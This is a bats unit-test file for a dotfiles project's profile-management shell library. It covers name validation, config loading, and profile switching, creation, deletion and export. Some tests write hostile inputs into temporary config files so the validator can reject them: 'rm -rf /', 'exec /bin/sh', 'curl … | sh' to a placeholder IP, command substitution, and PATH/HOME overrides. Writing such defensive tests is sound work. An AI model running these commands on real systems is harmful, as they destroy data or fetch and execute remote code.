#!/usr/bin/env bats

# Unit tests for lib/profiles.sh (core module).
#
# Run:
#   env -i HOME="$HOME" PATH="/usr/bin:/bin" TERM=xterm-256color bash ./tests/run-tests tests/unit/lib/profiles.bats

load '../../bats/helpers/setup'

setup() {
    ROOT="$(cd "$BATS_TEST_DIRNAME/../../.." && pwd)"
    export DOTFILES="$ROOT"
    TEST_DIR="$(temp_make)"
    export PROFILES_DIR="$TEST_DIR/profiles"
    export CURRENT_PROFILE_FILE="$TEST_DIR/profiles/.current"
    export CURRENT_GIT_CONFIG_FILE="$TEST_DIR/profiles/.current-git"
    export CURRENT_GCLOUD_CONFIG_FILE="$TEST_DIR/profiles/.current-gcloud"
    mkdir -p "$PROFILES_DIR"
    # shellcheck source=/dev/null
    source "$ROOT/lib/profiles.sh"
}

teardown() {
    temp_del "$TEST_DIR"
}

# ============================================
# Required loader / hygiene checks
# ============================================

@test "profiles loader defines every profile function" {
    export DOTFILES="$ROOT"
    run bash -c "source '$ROOT/lib/profiles.sh'; for f in profile_list profile_show profile_switch profile_create profile_edit profile_delete profile_export profile_import profile_validate profile_load profile_switch_git profile_switch_gcloud; do declare -F \$f >/dev/null || { echo missing \$f; exit 1; }; done"
    [ "$status" -eq 0 ]
}

@test "profiles code needs no menu library" {
    run grep -rnE "whiptail|interactive\.sh|_menu_selection|_confirm_dialog|_check_whiptail|profile_interactive_select" "$ROOT/lib/profiles.sh" "$ROOT/lib/profiles"
    [ "$status" -ne 0 ]
}

@test "profiles and hooks carry no personal data" {
    local paths=("$ROOT/lib/profiles.sh" "$ROOT/lib/profiles" "$ROOT/profiles")
    [ -d "$ROOT/git-hooks" ] && paths+=("$ROOT/git-hooks")
    # LC_ALL=C.UTF-8 keeps UTF-8 bracket expressions from matching emoji bytes under bare C.
    run env LC_ALL=C.UTF-8 grep -rnEi "nandomoreira|fernando|gmail\.com|homelab|tailscale" "${paths[@]}"
    [ "$status" -ne 0 ]
    run env LC_ALL=C.UTF-8 grep -rnE "[áàâãéêíóôõúç]|\b(não|erro|perfil|falha|arquivo)\b" "${paths[@]}"
    [ "$status" -ne 0 ]
}

# ============================================
# _profile_validate_name
# ============================================

@test "_profile_validate_name: accepts a simple valid name" {
    run _profile_validate_name "work"
    assert_success
}

@test "_profile_validate_name: accepts a name with a hyphen" {
    run _profile_validate_name "work-project"
    assert_success
}

@test "_profile_validate_name: accepts a name with an underscore" {
    run _profile_validate_name "work_project"
    assert_success
}

@test "_profile_validate_name: accepts a name with numbers" {
    run _profile_validate_name "work123"
    assert_success
}

@test "_profile_validate_name: rejects an empty name" {
    run _profile_validate_name ""
    assert_failure
}

@test "_profile_validate_name: rejects a name with a slash" {
    run _profile_validate_name "work/project"
    assert_failure
}

@test "_profile_validate_name: rejects path traversal" {
    run _profile_validate_name "../../../etc/passwd"
    assert_failure
}

@test "_profile_validate_name: rejects a name with spaces" {
    run _profile_validate_name "work project"
    assert_failure
}

@test "_profile_validate_name: rejects a name with special characters" {
    run _profile_validate_name "work@project"
    assert_failure
}

# ============================================
# _profile_exists
# ============================================

@test "_profile_exists: succeeds for an existing profile" {
    mkdir -p "$PROFILES_DIR/test-profile"
    run _profile_exists "test-profile"
    assert_success
}

@test "_profile_exists: fails for a missing profile" {
    run _profile_exists "nonexistent"
    assert_failure
}

# ============================================
# _profile_get_current / _profile_set_current
# ============================================

@test "_profile_get_current: returns empty when no profile is active" {
    run _profile_get_current
    assert_success
    assert_output ""
}

@test "_profile_set_current: sets the current profile" {
    _profile_set_current "test-profile"
    run _profile_get_current
    assert_success
    assert_output "test-profile"
}

# ============================================
# _profile_validate_config_file
# ============================================

@test "_profile_validate_config_file: accepts a valid config file" {
    local config_file="$TEST_DIR/valid.conf"
    cat > "$config_file" << 'EOF'
GIT_NAME="Test User"
GIT_EMAIL="test@example.com"
EOF
    run _profile_validate_config_file "$config_file"
    assert_success
}

@test "_profile_validate_config_file: rejects a file with rm -rf" {
    local config_file="$TEST_DIR/dangerous.conf"
    cat > "$config_file" << 'EOF'
rm -rf /
EOF
    run _profile_validate_config_file "$config_file"
    assert_failure
}

@test "_profile_validate_config_file: rejects a file with exec" {
    local config_file="$TEST_DIR/dangerous.conf"
    cat > "$config_file" << 'EOF'
exec /bin/sh
EOF
    run _profile_validate_config_file "$config_file"
    assert_failure
}

@test "_profile_validate_config_file: rejects a file with eval" {
    local config_file="$TEST_DIR/dangerous.conf"
    cat > "$config_file" << 'EOF'
eval "malicious_code"
EOF
    run _profile_validate_config_file "$config_file"
    assert_failure
}

@test "_profile_validate_config_file: rejects curl piped to sh" {
    local config_file="$TEST_DIR/dangerous.conf"
    cat > "$config_file" << 'EOF'
curl http://192.0.2.1/x | sh
EOF
    run _profile_validate_config_file "$config_file"
    assert_failure
}

@test "_profile_validate_config_file: rejects a missing file" {
    run _profile_validate_config_file "$TEST_DIR/nonexistent.conf"
    assert_failure
}

# ============================================
# _profile_load_conf_file
# ============================================

@test "_profile_load_conf_file: loads scalar KEY=value assignments" {
    local config_file="$TEST_DIR/load.conf"
    cat > "$config_file" << 'EOF'
# comment
GIT_NAME="Test User"
GIT_EMAIL='test@example.com'
GIT_GPG_FORMAT=ssh
EOF
    unset GIT_NAME GIT_EMAIL GIT_GPG_FORMAT
    _profile_load_conf_file "$config_file"
    [ "$GIT_NAME" = "Test User" ]
    [ "$GIT_EMAIL" = "test@example.com" ]
    [ "$GIT_GPG_FORMAT" = "ssh" ]
}

@test "_profile_load_conf_file: loads GCLOUD_PROJECTS array entries" {
    local config_file="$TEST_DIR/gcloud-load.conf"
    cat > "$config_file" << 'EOF'
GCLOUD_ACCOUNT="jane@example.com"
GCLOUD_PROJECTS=(
    "proj-a|Project A"
    "proj-b|Project B"
)
EOF
    unset GCLOUD_ACCOUNT
    GCLOUD_PROJECTS=()
    _profile_load_conf_file "$config_file"
    [ "$GCLOUD_ACCOUNT" = "jane@example.com" ]
    [ "${#GCLOUD_PROJECTS[@]}" -eq 2 ]
    [ "${GCLOUD_PROJECTS[0]}" = "proj-a|Project A" ]
    [ "${GCLOUD_PROJECTS[1]}" = "proj-b|Project B" ]
}

@test "_profile_load_conf_file: rejects command substitution in a value" {
    local config_file="$TEST_DIR/bad-sub.conf"
    cat > "$config_file" << 'EOF'
GIT_NAME="$(curl http://192.0.2.1/x)"
EOF
    run _profile_load_conf_file "$config_file"
    assert_failure
}

@test "_profile_load_conf_file: dry validate does not apply assignments" {
    local config_file="$TEST_DIR/dry.conf"
    cat > "$config_file" << 'EOF'
GIT_NAME="Should Not Stick"
EOF
    unset GIT_NAME
    run _profile_validate_config_file "$config_file"
    assert_success
    [ -z "${GIT_NAME:-}" ]
}

@test "_profile_load_conf_file: loads shipped linux-arch env.conf" {
    unset WAYLAND_DISPLAY XDG_SESSION_TYPE XDG_CURRENT_DESKTOP \
        XDG_CONFIG_HOME XDG_DATA_HOME XDG_CACHE_HOME \
        QT_QPA_PLATFORM QT_WAYLAND_DISABLE_WINDOWDECORATION \
        GDK_BACKEND MOZ_ENABLE_WAYLAND _JAVA_AWT_WM_NONREPARENTING
    _profile_load_conf_file "$ROOT/profiles/linux-arch/env.conf"
    [ "$XDG_SESSION_TYPE" = "wayland" ]
    [ "$XDG_CURRENT_DESKTOP" = "niri" ]
    [ "$XDG_CONFIG_HOME" = "$HOME/.config" ]
    [ "$XDG_DATA_HOME" = "$HOME/.local/share" ]
    [ "$QT_QPA_PLATFORM" = "wayland" ]
    [ "$_JAVA_AWT_WM_NONREPARENTING" = "1" ]
}

@test "_profile_load_conf_file: loads shipped linux-arch shell.conf" {
    unset DOTFILES_AUR_HELPER TERMINAL
    _profile_load_conf_file "$ROOT/profiles/linux-arch/shell.conf"
    [ "$DOTFILES_AUR_HELPER" = "yay" ]
    [ "$TERMINAL" = "ghostty" ]
}

@test "_profile_load_conf_file: expands \${NAME:-default} and keeps set values" {
    local config_file="$TEST_DIR/expand.conf"
    cat > "$config_file" << 'EOF'
export TERMINAL="${TERMINAL:-ghostty}"
export XDG_CONFIG_HOME="${XDG_CONFIG_HOME:-$HOME/.config}"
EOF
    unset TERMINAL XDG_CONFIG_HOME
    _profile_load_conf_file "$config_file"
    [ "$TERMINAL" = "ghostty" ]
    [ "$XDG_CONFIG_HOME" = "$HOME/.config" ]

    export TERMINAL="kitty"
    unset XDG_CONFIG_HOME
    _profile_load_conf_file "$config_file"
    [ "$TERMINAL" = "kitty" ]
}

@test "_profile_load_conf_file: rejects PATH overwrite" {
    local config_file="$TEST_DIR/evil-path.conf"
    cat > "$config_file" << 'EOF'
PATH="/tmp/evil"
EOF
    local saved_path="$PATH"
    run _profile_load_conf_file "$config_file"
    assert_failure
    [ "$PATH" = "$saved_path" ]
}

@test "_profile_load_conf_file: rejects HOME and DOTFILES overwrite" {
    local config_file="$TEST_DIR/evil-home.conf"
    cat > "$config_file" << 'EOF'
HOME="/tmp/evil-home"
EOF
    run _profile_load_conf_file "$config_file"
    assert_failure

    cat > "$config_file" << 'EOF'
DOTFILES="/tmp/evil-dotfiles"
EOF
    run _profile_load_conf_file "$config_file"
    assert_failure
}

@test "_profile_load_conf_file: rejects unsafe default in parameter expansion" {
    local config_file="$TEST_DIR/evil-default.conf"
    cat > "$config_file" << 'EOF'
TERMINAL="${TERMINAL:-$(id)}"
EOF
    run _profile_load_conf_file "$config_file"
    assert_failure
}

# ============================================
# profile_list
# ============================================

@test "profile_list: shows a message when no profile exists" {
    rm -rf "${PROFILES_DIR:?}"/*
    run profile_list
    assert_failure
    assert_output --partial "No profile found"
}

@test "profile_list: lists available profiles" {
    mkdir -p "$PROFILES_DIR/work"
    mkdir -p "$PROFILES_DIR/personal"
    run profile_list
    assert_success
    assert_output --partial "work"
    assert_output --partial "personal"
}

@test "profile_list: marks the active profile" {
    mkdir -p "$PROFILES_DIR/work"
    _profile_set_current "work"
    run profile_list
    assert_success
    assert_output --partial "work"
    assert_output --partial "active"
}

# ============================================
# profile_show
# ============================================

@test "profile_show: errors for a missing profile" {
    run profile_show "nonexistent"
    assert_failure
    assert_output --partial "not found"
}

@test "profile_show: errors for an invalid name" {
    run profile_show "../../../etc"
    assert_failure
    assert_output --partial "Invalid"
}

@test "profile_show: shows profile information" {
    mkdir -p "$PROFILES_DIR/test-profile"
    cat > "$PROFILES_DIR/test-profile/git.conf" << 'EOF'
GIT_NAME="Test User"
GIT_EMAIL="test@example.com"
EOF
    run profile_show "test-profile"
    assert_success
    assert_output --partial "test-profile"
}

# ============================================
# profile_switch
# ============================================

@test "profile_switch: fails without a profile name" {
    run profile_switch ""
    assert_failure
    assert_output --partial "not provided"
}

@test "profile_switch: fails for a missing profile" {
    run profile_switch "nonexistent"
    assert_failure
    assert_output --partial "not found"
}

@test "profile_switch: fails for an invalid name" {
    run profile_switch "../../../etc"
    assert_failure
    assert_output --partial "Invalid"
}

@test "profile_switch: switches to an existing profile" {
    mkdir -p "$PROFILES_DIR/work"
    run profile_switch "work"
    assert_success
    assert_output --partial "activated successfully"

    run _profile_get_current
    assert_output "work"
}

# ============================================
# profile_create
# ============================================

@test "profile_create: fails for an invalid name" {
    run profile_create "../../../etc"
    assert_failure
    assert_output --partial "Invalid"
}

@test "profile_create: fails for an existing profile" {
    mkdir -p "$PROFILES_DIR/existing"
    run profile_create "existing"
    assert_failure
    assert_output --partial "already exists"
}

@test "profile_create: creates a new profile with config files" {
    run profile_create "new-profile"
    assert_success
    assert_output --partial "created successfully"

    assert_file_exists "$PROFILES_DIR/new-profile/git.conf"
    assert_file_exists "$PROFILES_DIR/new-profile/shell.conf"
    assert_file_exists "$PROFILES_DIR/new-profile/env.conf"
    assert_file_exists "$PROFILES_DIR/new-profile/gcloud.conf"
}

# ============================================
# profile_delete
# ============================================

@test "profile_delete: fails without a profile name" {
    run profile_delete ""
    assert_failure
    assert_output --partial "not provided"
}

@test "profile_delete: fails for a missing profile" {
    run profile_delete "nonexistent"
    assert_failure
    assert_output --partial "not found"
}

@test "profile_delete: fails for an invalid name" {
    run profile_delete "../../../etc"
    assert_failure
    assert_output --partial "Invalid"
}

@test "profile_delete: does not allow removing the active profile" {
    mkdir -p "$PROFILES_DIR/active"
    _profile_set_current "active"
    run profile_delete "active"
    assert_failure
    assert_output --partial "active profile"
}

# ============================================
# profile_validate
# ============================================

@test "profile_validate: fails for a missing profile" {
    run profile_validate "nonexistent"
    assert_failure
    assert_output --partial "not found"
}

@test "profile_validate: succeeds for a valid profile" {
    mkdir -p "$PROFILES_DIR/valid"
    cat > "$PROFILES_DIR/valid/git.conf" << 'EOF'
GIT_NAME="Test User"
GIT_EMAIL="test@example.com"
EOF
    run profile_validate "valid"
    assert_success
    assert_output --partial "is valid"
}

@test "profile_validate: warns about incomplete settings" {
    mkdir -p "$PROFILES_DIR/incomplete"
    cat > "$PROFILES_DIR/incomplete/git.conf" << 'EOF'
GIT_NAME=""
GIT_EMAIL=""
EOF
    run profile_validate "incomplete"
    assert_failure
    assert_output --partial "not configured"
}

@test "profile_validate: ignores inherited GIT_NAME when file omits it" {
    mkdir -p "$PROFILES_DIR/email-only"
    cat > "$PROFILES_DIR/email-only/git.conf" << 'EOF'
GIT_EMAIL="only@example.com"
EOF
    export GIT_NAME="Stale From Caller"
    run profile_validate "email-only"
    assert_failure
    assert_output --partial "not configured"
}

# ============================================
# profile_export / profile_import
# ============================================

@test "profile_export: fails for a missing profile" {
    run profile_export "nonexistent"
    assert_failure
    assert_output --partial "not found"
}

@test "profile_export: exports an existing profile" {
    mkdir -p "$PROFILES_DIR/export-test"
    touch "$PROFILES_DIR/export-test/git.conf"

    local output_file="$TEST_DIR/export-test.tar.gz"
    run profile_export "export-test" "$output_file"
    assert_success
    assert_output --partial "exported"
    assert_file_exists "$output_file"
}

@test "profile_import: fails for a missing file" {
    run profile_import "$TEST_DIR/nonexistent.tar.gz"
    assert_failure
    assert_output --partial "not found"
}
